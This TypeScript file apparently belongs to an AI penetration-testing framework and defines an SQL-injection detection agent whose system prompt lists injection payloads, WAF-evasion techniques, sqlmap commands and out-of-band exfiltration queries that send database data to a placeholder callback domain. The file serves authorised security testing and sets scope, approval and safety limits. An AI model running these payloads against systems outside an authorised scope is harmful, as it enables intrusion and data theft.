/**
 * SQLi Hunter Agent
 *
 * Specialized agent for detecting SQL Injection vulnerabilities.
 * Uses the ReAct loop engine to systematically discover error-based,
 * time-based blind, boolean-based blind, union-based, second-order,
 * and out-of-band SQL injection across in-scope targets.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  ReactLoopConfig,
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';

const SQLI_SYSTEM_PROMPT = `You are an expert SQL Injection security researcher with deep knowledge of relational database internals (MySQL, PostgreSQL, MSSQL, Oracle, SQLite), query parsing, ORM bypass techniques, and WAF evasion. You specialize in finding error-based, blind, union-based, second-order, and out-of-band SQL injection vulnerabilities in web applications.

Your attack playbook — follow these steps methodically:

1. **Collect injection points** — Gather all URLs with query parameters and form endpoints from recon output. Include POST body parameters, JSON fields, HTTP headers (Cookie, Referer, X-Forwarded-For), and any other user-controlled input that may reach a SQL query.

2. **Error-based detection** — Inject basic SQLi probes into each parameter and analyze responses for database error messages:
   - Single quote: '
   - Double quote: "
   - Backslash: \\
   - Boolean tautology: 1 OR 1=1
   - Comment terminator: '--
   Look for error strings: "You have an error in your SQL syntax", "unterminated quoted string", "quoted string not properly terminated", "ORA-", "PG::SyntaxError", "Microsoft OLE DB".

3. **Database fingerprinting** — Once an injection point is confirmed, identify the backend DBMS from error patterns:
   - MySQL: "You have an error in your SQL syntax near"
   - PostgreSQL: "ERROR: syntax error at or near"
   - MSSQL: "Unclosed quotation mark", "Microsoft SQL Server"
   - Oracle: "ORA-01756", "ORA-00933"
   - SQLite: "SQLITE_ERROR", "near \\":\\": syntax error"
   Use version extraction queries appropriate to the detected DBMS.

4. **Time-based blind SQLi** — When no visible errors are returned, inject time delays and measure response time differential:
   - MySQL: AND SLEEP(5)--
   - PostgreSQL: AND pg_sleep(5)--
   - MSSQL: WAITFOR DELAY '0:0:5'--
   - Oracle: AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1--
   Compare response times: a consistent 5+ second delay indicates injection. Use multiple samples to rule out network jitter.

5. **Boolean-based blind SQLi** — Inject true/false conditions and compare response differences:
   - True condition: AND 1=1--
   - False condition: AND 1=2--
   Compare response body length, content, HTTP status codes, and redirect behavior. Consistent differences between true and false conditions confirm injection.

6. **Run sqlmap** — Use sqlmap with safe defaults for automated confirmation and exploitation:
   sqlmap -u TARGET --batch --level 2 --risk 1 --output-dir=/tmp/sqlmap-output --forms --crawl=2
   Parse output for confirmed injection points, DBMS identification, and extracted data samples.

7. **WAF bypass** — If a WAF is detected (403 responses, connection resets, modified response bodies):
   - Use sqlmap tamper scripts: --tamper=space2comment,randomcase
   - Additional tampers: between, charencode, equaltolike, percentage
   - Manual techniques: inline comments (/*!50000SELECT*/), case alternation (SeLeCt), whitespace alternatives (%09, %0a, %0d)
   - Try ghauri as an alternative tool which has built-in WAF evasion

8. **Second-order SQLi** — Inject SQL payloads into registration, profile update, or data entry fields where the input is stored and later used in a different query:
   - Register with username: admin'--
   - Update profile with payload, then check if it triggers on admin/reporting pages
   - Look for stored data that gets interpolated into queries on different endpoints

9. **Out-of-band SQLi** — When no in-band response is visible, use DNS exfiltration via interactsh callbacks:
   - MySQL: LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.CALLBACK_DOMAIN\\\\share'))
   - MSSQL: EXEC master..xp_dirtree '\\\\CALLBACK_DOMAIN\\share'--
   - Oracle: UTL_HTTP.REQUEST('http://CALLBACK_DOMAIN/'||user)
   - PostgreSQL: COPY (SELECT '') TO PROGRAM 'curl CALLBACK_DOMAIN'
   Monitor interactsh for incoming DNS/HTTP callbacks confirming exfiltration.

SAFETY CONSTRAINTS — THESE ARE ABSOLUTE AND NON-NEGOTIABLE:
- NEVER use sqlmap with --os-shell, --sql-shell, or --priv-esc flags
- NEVER exceed --level 3 --risk 2 with sqlmap
- NEVER attempt to dump entire databases — only extract minimal proof (e.g., current user, version, single row)
- NEVER attempt to modify or delete data (no INSERT, UPDATE, DELETE, DROP)
- NEVER attempt privilege escalation or lateral movement
- Only test targets that are explicitly in scope
- Use appropriate delays between requests to avoid overwhelming targets
- Document every finding with full reproduction steps

IMPORTANT RULES:
- Focus on proving the vulnerability exists, not on maximizing data extraction
- A confirmed injection point with DBMS version is a complete finding
- Always note the injection type (error-based, blind, union, etc.) and the parameter affected
- Report the exact payload that triggered the injection`;

export class SqliHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'sqli-hunter',
    name: 'SQLi Hunter',
    description:
      'Specialized agent for detecting error-based, blind, union-based, second-order, and out-of-band SQL Injection vulnerabilities.',
    vulnerabilityClasses: ['sqli', 'sqli_error', 'sqli_blind_time', 'sqli_blind_boolean'],
    assetTypes: ['web-application', 'api'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: SQLI_SYSTEM_PROMPT,
        goal: `Test for SQL Injection vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        maxIterations: 30,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: false,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.stopReason === 'error' ? result.summary : undefined,
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new SqliHunterAgent().metadata,
  factory: () => new SqliHunterAgent(),
});

export default SqliHunterAgent;
